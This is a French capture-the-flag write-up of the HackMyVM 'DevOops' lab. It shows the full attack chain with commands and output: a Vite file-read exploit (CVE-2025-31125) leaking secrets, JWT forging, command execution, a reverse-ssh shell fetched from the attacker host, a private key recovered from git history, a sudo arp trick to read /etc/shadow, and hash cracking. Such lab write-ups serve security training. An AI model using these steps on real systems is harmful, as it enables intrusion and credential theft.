---
title: "Solution du CTF DevOops de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### DevOops I did (not do) it again

En téléchargeant le CTF DevOops sur HackMyVM.eu j'avais un peu peur qu'il s'agisse du même CTF que celui disponible sur HackTheBox à une époque (voir mon [writeup]({% link _posts/2018-10-14-Solution-du-CTF-DevOops-de-HackTheBox.md %})).

Mais le scénario était d'emblée différent avec seulement un port HTTP ouvert.

```console
$ sudo nmap -p- -T5 192.168.56.106
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.106
Host is up (0.00023s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
3000/tcp open  ppp
MAC Address: 08:00:27:F3:BE:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.48 seconds
```

Quand on se rend sur ce site, on tombe sur ce qui semble être une page par défaut pour des technologies basées sur NodeJS.

Il est question de `Creating a Vue.js + Express.js Project`.

J'ai commencé par énumérer les fichiers et dossiers :

```bash
feroxbuster -u http://192.168.56.106:3000/ -w tools/DirBuster-0.12/directory-list-2.3-big.txt -n
```

J'ai trouvé quelques endpoints d'API :

```
200      130l      348w    21764c http://192.168.56.106:3000/server
200        1l        1w      189c http://192.168.56.106:3000/sign
401        1l        2w       48c http://192.168.56.106:3000/execute
```

Le plus utile pour commencer semble `/server` qui retourne du code source. Voici la plus grosse partie :

```js
const app = express();

const address = 'localhost';
const port = 3001;

const exec_promise = promisify(exec);

const COMMAND_FILTER = process.env.COMMAND_FILTER
    ? process.env.COMMAND_FILTER.split(',')
        .map(cmd => cmd.trim().toLowerCase())
        .filter(cmd => cmd !== '')
    : [];

app.use(express.json());

function is_safe_command(cmd) {
    if (!cmd || typeof cmd !== 'string') {
        return false;
    }
    if (COMMAND_FILTER.length === 0) {
        return false;
    }

    const lower_cmd = cmd.toLowerCase();

    for (const forbidden of COMMAND_FILTER) {
        const regex = new RegExp(`\\b${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b|^${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');
        if (regex.test(lower_cmd)) {
            return false;
        }    }

    if (/[;&|]/.test(cmd)) {
        return false;
    }
    if (/[<>]/.test(cmd)) {
        return false;
    }
    if (/[`$()]/.test(cmd)) {
        return false;
    }

    return true;
}

async function execute_command_sync(command) {
    try {
        const { stdout, stderr } = await exec_promise(command);

        if (stderr) {
            return { status: false, data: { stdout, stderr } };
        }
        return { status: true, data: { stdout, stderr } };
    } catch (error) {
        return { status: true, data: error.message };
    }
}

app.get('/api/sign', (req, res) => {
    return res.json({
        'status': 'signed',
        'data': jwt.sign({
            uid: -1,
            role: 'guest',
        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),
    });
});

app.get('/api/execute', async (req, res) => {
    const authorization_header_raw = req.headers['authorization'];
    if (!authorization_header_raw || !authorization_header_raw.startsWith('Bearer ')) {
        return res.status(401).json({
            'status': 'rejected',
            'data': 'permission denied'
        });
    }

    const jwt_raw = authorization_header_raw.split(' ')[1];

    try {
        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
        if (payload.role !== 'admin') {
            return res.status(403).json({
                'status': 'rejected',
                'data': 'permission denied'
            });
        }
    } catch (err) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `permission denied`
        });
    }

    const command = req.query.cmd;

    const is_command_safe = is_safe_command(command);
    if (!is_command_safe) {
        return res.status(401).json({
            'status': 'rejected',
            'data': `this command is unsafe`
        });
    }

    const result = await execute_command_sync(command);

    return res.json({
        'status': result.status === true ? 'executed' : 'failed',
        'data': result.data
    })
});
```

À la suite de ces lignes, on a des données encodées en base64 qui ressemblent à ceci :

```
//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzI...
```

Je les ai décodées et obtenu un dictionnaire JSON. Il a deux clés principales, l'une qui contient du code source (mais ça semble correspondre à ce que l'on a déjà) et l'autre contient des séries de 4 caractères dont j'ignore la signification :

```
"mappings": "AAAA,MAAM,CAAC,0BAA0B,CAAC,IAAI,CAAC,CAAC,CAAC,YAAY,CAAC,CAAC,IAAI,CAAC,IAAI,CAAC,OAAO,CAAC,EAAE,CAAC,CAAC,CAAC,QAAQ,CAAC,CAAC,CAAC,KAAK,...
```

J'ai questionné l'IA Gemini là-dessus et ça correspondrait à une "source map". Une sorte d'index de correspondance entre code minifié et code non-minifié. Au final, rien de vraiment intéressant ici.

L'accès à l'endpoint `/sign` retourne un dictionnaire, comme on pouvait s'y attendre d'après le code source :

```json
{"status":"signed","data":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDk1NjI2MDcsImV4cCI6MTc0OTU2NDQwN30.r0aq0-xcBGSkZbqLBoqjtx3idvRP9bF_iJA-3vnBUBg"}
```

Si on soumet le base64 sur un décodeur JWT en ligne comme [JWT.io](https://jwt.io/) on obtient ceci :

```json
{
  "uid": -1,
  "role": "guest",
  "iat": 1749562607,
  "exp": 1749564407
}
```

Une fois de plus, aucune surprise par rapport au code source.

Je ne suis pas expert en ExpressJS, mais avec la présence de `jwt.verify`, l'accès à `/api/execute` semble être correctement sécurisé.

Par conséquent, j'ai d'abord tenté de casser le mot de passe qui sert à signer les tokens. Il suffit de donner ce token ainsi que le format attendu à JtR :

```bash
john --format=HMAC-SHA256 --wordlist=wordlists/rockyou.txt jwt_hash.txt
```

Sans succès... Une autre attaque possible sur les tokens JWT consiste à en créer un avec l'algo `none` pour la signature, ce qui peut avoir pour effet de bypasser la vérification.

Avec JWT.io, on peut changer le paramètre et obtenir un nouveau token.

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

On aura bien sûr mis `admin` à la place de `guest` dans le payload.

### Vite !

N'ayant obtenu aucun résultat, j'ai fouillé du côté des vulnérabilités connues en lançant Nuclei sur le serveur. Cette fois la pèche était bonne :

```
[CVE-2025-31125] [http] [medium] http://192.168.56.106:3000/@fs/etc/passwd?import&?inline=1.wasm?init
```

Si on ouvre l'URL donnée, on obtient du base64 qui se décode vers le fichier attendu `passwd`, on a donc un directory traversal :

```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
chrony:x:101:102:chrony:/var/log/chrony:/sbin/nologin
runner:x:1000:1000:::/bin/sh
hana:x:1001:100::/home/hana:/bin/sh
gitea:x:102:82:gitea:/var/lib/gitea:/bin/sh
```

La vulnérabilité est décrite ici : [CVE-2025-31125 - Vite Leaks Local Files via ?inline&import or ?raw?import](https://www.cve.news/cve-2025-31125/)

Il y a notamment un exemple pour faire fuiter les secrets de l'application, mais ça n'a pas fonctionné dans mon cas :

```console
$ curl "http://192.168.56.106:3000/.env?import&inline"

    <body>
      <h1>403 Restricted</h1>
      <p>The request url "/opt/node/.env" is outside of Vite serving allow list.<br/><br/>- /opt/node<br/><br/>Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.</p>
      <style>
        body {
          padding: 1em 2em;
        }
      </style>
    </body>
```

J'ai toutefois l'information que le code semble être présent dans `/opt/node`, je peux donc utiliser l'URL trouvée par Nuclei pour obtenir le fichier :

```console
$ curl "http://192.168.56.106:3000/@fs/opt/node/.env?import&?inline=1.wasm?init"

import initWasm from "/@id/__x00__vite/wasm-helper.js"
export default opts => initWasm(opts, "data:application/octet-stream;base64,SldUX1NFQ1JFVD0nMjk0MnN6S0c3RXY4M2FEdml1Z0FhNnJGcEtpeFp6WnonCkNPTU1BTkRfRklMVEVSPSduYyxweXRob24scHl0aG9uMyxweSxweTMsYmFzaCxzaCxhc2gsfCwmLDwsPixscyxjYXQscHdkLGhlYWQsdGFpbCxncmVwLHh4ZCcK")

//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjoz--- snip ---xNQUFNLENBQUMsd0xBQXdMLENBQUM7In0=
```

Seule la première partie nous intéresse (le `ops`) et ça se décode ainsi :

```bash
JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'
COMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'
```

J'avais aussi dumpé `/proc/self/environ` mais on n'y retrouve pas les secrets qui doivent être chargés par le framework.

```
EINFO_LOG=/etc/init.d/node
USER=runner
npm_config_user_agent=pnpm/10.8.1 npm/? node/v22.13.1 linux x64
npm_node_execpath=/usr/bin/node
SHLVL=7
HOME=
RC_SVCNAME=node
npm_config_registry=https://registry.npmjs.org/
TERM=vt102
RC_SERVICE=/etc/init.d/node
SVCNAME=node
npm_config_node_gyp=/usr/local/lib/node_modules/pnpm/dist/node_modules/node-gyp/bin/node-gyp.js
PATH=/opt/node/node_modules/.bin:/opt/node/node_modules/.bin:/usr/local/lib/node_modules/pnpm/dist/node-gyp-bin:/bin:/sbin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
EINFO_LASTCMD=ebegin
npm_package_name=devoops
NODE=/usr/bin/node
npm_config_frozen_lockfile=
npm_lifecycle_script=nodemon
npm_package_version=0.0.0
npm_lifecycle_event=dev
npm_config_verify_deps_before_run=false
NODE_PATH=/opt/node/node_modules/.pnpm/vite@6.2.0/node_modules/vite/bin/node_modules:/opt/node/node_modules/.pnpm/vite@6.2.0/node_modules/vite/node_modules:/opt/node/node_modules/.pnpm/vite@6.2.0/node_modules:/opt/node/node_modules/.pnpm/node_modules:/opt/node/node_modules/.pnpm/concurrently@9.1.2/node_modules/concurrently/dist/bin/node_modules:/opt/node/node_modules/.pnpm/concurrently@9.1.2/node_modules/concurrently/dist/node_modules:/opt/node/node_modules/.pnpm/concurrently@9.1.2/node_modules/concurrently/node_modules:/opt/node/node_modules/.pnpm/concurrently@9.1.2/node_modules:/opt/node/node_modules/.pnpm/node_modules:/opt/node/node_modules/.pnpm/nodemon@3.1.9/node_modules/nodemon/bin/node_modules:/opt/node/node_modules/.pnpm/nodemon@3.1.9/node_modules/nodemon/node_modules:/opt/node/node_modules/.pnpm/nodemon@3.1.9/node_modules:/opt/node/node_modules/.pnpm/node_modules
PWD=/opt/node
npm_execpath=/usr/local/lib/node_modules/pnpm/bin/pnpm.cjs
npm_command=run-script
PNPM_SCRIPT_SRC_DIR=/opt/node
INIT_CWD=/opt/node
```

Désormais avec le `JWT_SECRET` je peux forger un token valide et accéder à `/execute`. J'ai dû changer la date d'expiration (`exp`) du token à demain pour qu'il soit accepté.

### With a cup of tea

```console
$ curl "http://192.168.56.106:3000/execute?cmd=id" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MTgwMjA1ODMsImV4cCI6MTc0OTY1MzMwMn0.7fTcfCHHH1xeqFoFS6zwMgzf6yBzE45p1IlW8xb56_g"
{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}
```

Comme vous avez pu le voir plus tôt dans les secrets dumpés, l'endpoint a un filtre sur ce qu'il est possible de passer comme commandes. Sans redirections, pipe et commandes contenant `sh` on est vite limités et ça a été compliqué d'avoir un shell interactif.

S'ajoute à celà d'autres difficultés :

- L'utilisateur `runner` n'ayant pas de dossier personnel spécifié dans `/etc/passwd` on ne pourra pas passer par SSH qui va chercher les clés dans le dossier personnel (il faut aussi forwarder le port 22).

- bash est absent du système

Avant d'aller plus loin et puisque `ls` est blacklisté aussi, j'ai utilisé `stat` sur le dossier courant :

```
Access: (0770/drwxrwx---)  Uid: (    0/    root)   Gid: ( 1000/  runner)
```

Youpi ! Je peux écrire dedans, ça va faciliter les choses. J'ai donc téléchargé `reverse-sshx64` (sous le nom `rev64`) depuis mon port 80 (car il y a aussi des règles de trafic sortant sur la VM).

Il m'a fallu du temps à comprendre pourquoi `reverse-ssh` ne voulait pas tourner : par défaut il exécute `bash` mais n'étant pas présent et ne pouvant pas spécifier `sh` dans la ligne de commande, j'ai utilisé `ash` avec un wildcard :

```bash
./rev64 -v -s /bin/as*
```

Une fois connecté, je découvre des process Gitea :

```
 2464 root      0:00 supervise-daemon gitea --start --pidfile /run/gitea.pid --respawn-delay 2 --respawn-max 5 --respawn-period 1800 --capabilities ^cap_net_bind_service --user gitea --env GITEA_WORK_DIR=/var/lib/gitea --chdir /var/lib/gitea --stdout /var/log/gitea/http.log --stderr /var/log/gitea/http.log /usr/bin/gitea -- web --config /etc/gitea/app.ini
 2465 gitea     0:11 /usr/bin/gitea web --config /etc/gitea/app.ini
```

Le fichier de configuration donne quelques infos utiles :

```bash
# Configuration cheat sheet: https://docs.gitea.io/en-us/config-cheat-sheet/
RUN_USER = gitea
RUN_MODE = prod
APP_NAME = Gitea: Git with a cup of tea
WORK_PATH = /var/lib/gitea

[repository]
ROOT = /opt/gitea/git
SCRIPT_TYPE = sh

[server]
STATIC_ROOT_PATH = /usr/share/webapps/gitea
APP_DATA_PATH = /var/lib/gitea/data
LFS_START_SERVER = true
HTTP_ADDR = 127.0.0.1
HTTP_PORT = 3002
SSH_DOMAIN = devoops.hmv
DOMAIN = devoops.hmv
ROOT_URL = http://devoops.hmv:3002/
DISABLE_SSH = false
SSH_PORT = 22
LFS_JWT_SECRET = 22TYqzojoq0KDtQOfuuiF8ir5_LlqVcc0FeNgTu-OkU
OFFLINE_MODE = true

[database]
DB_TYPE = sqlite3
PATH = /opt/gitea/db/gitea.db
SSL_MODE = disable
--- snip ---

[security]
INSTALL_LOCK = true
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3NDUyMTUwNzF9.V87lLErr_xxUZ8Dy1q_ZhOhaS4z-Dxdx0utHgDMOAb4
PASSWORD_HASH_ALGO = pbkdf2

[oauth2]
JWT_SECRET = jkFHJFxfiMkVnNVRqJOz2jkDzsrsBejztF7GlN25l8M
```

On est reparti pour des tokens JWT ? Pas sûr. Je me suis d'abord orienté vers la base de données sqlite3 du logiciel :

```console
$ sqlite3 gitea.db 
SQLite version 3.49.2 2025-05-07 10:39:52
Enter ".help" for usage hints.
sqlite> .tables
access                     oauth2_grant             
access_token               org_user
--- snip ---
user
--- snip ---
sqlite> .schema user
CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `keep_email_private` INTEGER NULL, `email_notifications_preference` TEXT DEFAULT 'enabled' NOT NULL, `passwd` TEXT NOT NULL, `passwd_hash_algo` TEXT DEFAULT 'argon2' NOT NULL, `must_change_password` INTEGER DEFAULT 0 NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER DEFAULT 0 NOT NULL, `login_name` TEXT NULL, `type` INTEGER NULL, `location` TEXT NULL, `website` TEXT NULL, `rands` TEXT NULL, `salt` TEXT NULL, `language` TEXT NULL, `description` TEXT NULL, `created_unix` INTEGER NULL, `updated_unix` INTEGER NULL, `last_login_unix` INTEGER NULL, `last_repo_visibility` INTEGER NULL, `max_repo_creation` INTEGER DEFAULT -1 NOT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `is_restricted` INTEGER DEFAULT 0 NOT NULL, `allow_git_hook` INTEGER NULL, `allow_import_local` INTEGER NULL, `allow_create_organization` INTEGER DEFAULT 1 NULL, `prohibit_login` INTEGER DEFAULT 0 NOT NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `use_custom_avatar` INTEGER NULL, `num_followers` INTEGER NULL, `num_following` INTEGER DEFAULT 0 NOT NULL, `num_stars` INTEGER NULL, `num_repos` INTEGER NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL, `visibility` INTEGER DEFAULT 0 NOT NULL, `repo_admin_change_team_access` INTEGER DEFAULT 0 NOT NULL, `diff_view_style` TEXT DEFAULT '' NOT NULL, `theme` TEXT DEFAULT '' NOT NULL, `keep_activity_private` INTEGER DEFAULT 0 NOT NULL);
CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`);
CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`);
CREATE INDEX `IDX_user_created_unix` ON `user` (`created_unix`);
CREATE INDEX `IDX_user_updated_unix` ON `user` (`updated_unix`);
CREATE INDEX `IDX_user_last_login_unix` ON `user` (`last_login_unix`);
CREATE INDEX `IDX_user_is_active` ON `user` (`is_active`);
sqlite> select * from user;
1|hana|hana||hana@devoops.hmv|0|enabled|e39b7d7a4e1af7cbb70c0d3979966cdccbc6284dc4da2ae06f79cfaa9638e8b07c196e393b9b1a77e15cacd18b7483a99f34|pbkdf2$50000$50|0|0|0||0|||7bdd02b3872d411fd17d89c6e3c23c8f|091f707d36a696ab6ddff577e3967a82|zh-CN||1745215071|1745217381|1745216383|1|-1|1|1|0|0|0|1|0|756bc140f74fc25280ea785e3aa4e9d0|hana@devoops.hmv|0|0|0|0|1|0|0|0|0|unified|gitea-auto|0
```

J'ai tenté de casser le hash avec JTR. Il faut le reformater avec le préfixe `pbkdf25000050`, le `salt` puis l'entrée `password` mais JTR ne voulait rien savoir. Je pense que la partie password était trop longue pour lui.

Gitea ne va pas s'encombrer à stocker les fichiers Git en base, les répos sont présents sur le disque :

```console
/opt/node $ ls -al /opt/gitea/git/hana/node.git/
total 44
drwxr-xr-x    8 gitea    www-data      4096 Apr 21 14:36 .
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 ..
-rw-r--r--    1 gitea    www-data        21 Apr 21 14:35 HEAD
drwxr-xr-x    2 gitea    www-data      4096 Apr 21 14:35 branches
-rw-r--r--    1 gitea    www-data        66 Apr 21 14:35 config
-rw-r--r--    1 gitea    www-data        73 Apr 21 14:35 description
drwxr-xr-x    6 gitea    www-data      4096 Apr 21 14:35 hooks
drwxr-xr-x    2 gitea    www-data      4096 Apr 21 14:36 info
drwxr-xr-x    3 gitea    www-data      4096 Apr 21 14:35 logs
drwxr-xr-x   24 gitea    www-data      4096 Apr 21 14:36 objects
drwxr-xr-x    4 gitea    www-data      4096 Apr 21 14:35 refs
```

Dans les commits, on voit une correction qui semble prometteuse :

```console
/opt/gitea/git/hana/node.git $ git log
commit 1994a70bbd080c633ac85a339fd85a8635c63893 (HEAD -> main)
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:36:12 2025 +0800

    del: oops!

commit 02c0f912f6e5b09616580d960f3e5ee33b06084a
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:34:37 2025 +0800

    init: init commit

/opt/gitea/git/hana/node.git $ git show 1994a70bbd080c633ac85a339fd85a8635c63893
commit 1994a70bbd080c633ac85a339fd85a8635c63893 (HEAD -> main)
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:36:12 2025 +0800

    del: oops!

diff --git a/id_ed25519 b/id_ed25519
deleted file mode 100644
index a2626a4..0000000
--- a/id_ed25519
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
------END OPENSSH PRIVATE KEY-----
```

Vu que le port SSH n'est pas accessible, je l'ai forwardé sur ma machine via le port de reverse-ssh :

```bash
ssh -p 31337 -N -L 2222:127.0.0.1:22 192.168.56.106
```

Mais j'avais un problème avec la clé privée :

```console
$ ssh -p 2222 -i priv_key hana@127.0.0.1
Load key "priv_key": error in libcrypto
hana@127.0.0.1's password:
```

En effet, elle n'est pas formatée correctement :

```console
$ ssh-keygen -l -f priv_key
priv_key is not a key file.
```

Une fois corrigé :

```bash
cat > priv_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
EOF
```

Cela fonctionne :

```console
$ ssh -p 2222 -i priv_key hana@127.0.0.1

devoops:~$ id
uid=1001(hana) gid=100(users) groups=100(users),100(users)
devoops:~$ ls
user.flag
devoops:~$ cat user.flag 
flag{03d0e150ae9fc686a827b41e1969d497}
```

### Shadow

La permission sudo de l'utilisatrice était inattendue :

```console
devoops:~$ sudo -l
Matching Defaults entries for hana on devoops:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for hana:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User hana may run the following commands on devoops:
    (root) NOPASSWD: /sbin/arp
```

On trouve un GTFObin pour la commande `arp` :

```console
devoops:~$ sudo arp -v -f "/etc/shadow"
>> root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
arp: format error on line 1 of etherfile /etc/shadow !
--- snip ---
>> chrony:!:20199:0:99999:7:::
arp: format error on line 19 of etherfile /etc/shadow !
>> runner:$6$sAhdpizXgKayGrqM$lcoysLIY9dsxpwy6cyWHBS/pPbvG4KmlM06SSad0PIWrJcXssseL4EZxzF369gaPZvgyD5JXKHVCXfFUDjciP/:20199:0:99999:7:::
arp: format error on line 20 of etherfile /etc/shadow !
>> hana:$6$snNJGjzsPo.be3r1$V8NneKBkVIZYE6XOFTk1Bq2Trjyf5lO6uQUcWXogI3IiWDEiBDS2yEdck.hx0dIdmIIHGkJX7cfH3zXqKVXcc1:20199:0:99999:7:::
arp: format error on line 21 of etherfile /etc/shadow !
>> gitea::20199:0:99999:7:::
arp: format error on line 22 of etherfile /etc/shadow !
```

J'ai lancé JTR sur le hash. Ça a pris pas mal de temps. Au point que je me suis demandé si je ne devais pas trouver un autre fichier, mais je n'avais pas trop d'idées. Finalement le mot de passe est tombé :

```console
$ john --wordlist=rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Note: Passwords longer than 26 [worst case UTF-8] to 79 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
eris             (root)     
1g 0:01:52:52 DONE (2025-06-10 20:23) 0.000148g/s 1222p/s 1222c/s 1222C/s erisedyoel..erinway
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Finito :

```console
/opt/gitea/git/hana/node.git $ su 
Password: 
/opt/gitea/git/hana/node.git # cd
~ # ls
N073.7X7              R007.7x7oOoOoOoOoOoO
~ # cat *7*
ssh://runner:Bo6xQ8Vrjm7rV1tii2gfRVW6T59jgGF7novHfQrkU3tzKmzVFxE7278L5raa2x9qCihrTrD6v0fu1m61ZkxJB5Gw@devoops.hmv
ssh://hana:UYi5Moj0BQw0QrGahe7i2Bs6VcyUcQMvmqDPs8aPdy8rJqBrcgPm33hbzBbY8j0og3aHN5bqAbKpze97BCLvuhgL@devoops.hmv
ssh://root:eris@devoops.hmv

gitea://hana:saki

jwt secret:
y0u_n3v3r_kn0w_1t -> BASE58 -> 2942szKG7Ev83aDviugAa6rF

user flag:
devoooooooops! -> MD5 -> flag{03d0e150ae9fc686a827b41e1969d497}

root flag:
Debug the world -> d36u9_th3_w0r1d! -> MD5 -> flag{a834296543f4c2990909ce1c56becfba}

flag{a834296543f4c2990909ce1c56becfba}
```
